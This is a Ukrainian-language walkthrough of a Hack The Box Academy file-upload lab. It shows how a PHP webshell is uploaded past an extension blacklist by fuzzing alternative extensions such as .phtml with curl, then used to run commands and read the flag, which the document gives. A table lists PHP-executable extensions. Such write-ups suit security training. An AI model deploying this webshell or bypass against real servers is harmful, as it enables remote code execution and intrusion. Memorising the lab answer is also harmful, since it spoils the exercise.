## File Uploads — Blacklist Bypass: Extension Fuzzing

**Модуль:** [File Upload Attacks](https://academy.hackthebox.com/app/module/136)
**Секція:** [Blacklist Filters](https://academy.hackthebox.com/app/module/136/section/1280)
**Завдання:** Обійти blacklist розширень → завантажити shell → `/flag.txt`
**Прапор:** `HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}`

***

## Концепція

**Blacklist validation** — сервер блокує конкретні розширення (`.php`, `.phar` тощо) але не всі PHP-сумісні варіанти. Apache/Nginx виконують файли з альтернативними розширеннями якщо вони зареєстровані у конфігурації як PHP handler.

***

## Крок 1 — Створити webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

***

## Крок 2 — Фаззинг дозволених розширень

```bash
TARGET="http://TARGET_IP:PORT"

for ext in phtml php2 php3 php4 php5 php6 php7 phps pht phtm shtml; do
  cp /tmp/shell.php /tmp/shell.$ext
  RESP=$(curl -s -X POST "$TARGET/upload.php" \
    -F "uploadFile=@/tmp/shell.$ext;type=image/gif")
  echo "$ext: $RESP"
done
```

**Результат:** всі розширення прийняті (`File successfully uploaded`).

***

## Крок 3 — Знайти виконуване розширення

```bash
# Перевіряємо які з них виконуються як PHP
for ext in phtml php3 php5 pht phtm; do
  RES=$(curl -s "$TARGET/profile_images/shell.$ext?cmd=id")
  echo "$ext: $(echo $RES | grep -o 'uid=[^ <]*')"
done
```

**Перший спрацьований:** `.phtml`

***

## Крок 4 — RCE і прапор

```bash
curl -s "$TARGET/profile_images/shell.phtml?cmd=id"
# uid=33(www-data)

curl -s "$TARGET/profile_images/shell.phtml?cmd=cat+/flag.txt"
# HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
```

***

## PHP-сумісні розширення (blacklist bypass)

| Розширення | Виконується Apache | Примітка |
|---|---|---|
| `.phtml` | ✅ Зазвичай | Найнадійніший bypass |
| `.php3` / `.php4` / `.php5` | ✅ Зазвичай | Legacy підтримка |
| `.pht` / `.phtm` | ✅ Іноді | Залежить від конфігу |
| `.shtml` | ⚠️ Рідко | SSI, не PHP |
| `.php7` | ✅ Іноді | PHP 7 specific |
| `.phps` | ❌ Показує source | Не виконується |

***

## Прапор

```
HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
```
